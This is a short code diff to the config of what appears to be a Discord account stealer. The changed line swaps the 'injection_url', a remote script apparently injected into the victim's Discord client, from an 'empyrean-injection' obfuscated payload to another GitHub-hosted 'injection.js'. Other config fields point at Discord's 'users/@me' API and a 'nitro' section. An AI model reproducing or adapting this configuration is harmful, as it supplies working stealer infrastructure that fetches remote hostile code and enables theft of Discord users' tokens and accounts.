@@ -14,7 +14,7 @@ const config = {
   embed_name: '@7night', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1069552184934539315/1074185375980982422/7night.png', 
   embed_color: 0, 
-  injection_url: 'https://raw.githubusercontent.com/addi00000/empyrean-injection/master/obfuscated.js', 
+  injection_url: 'https://raw.githubusercontent.com/extend1/1nject/main/injection.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
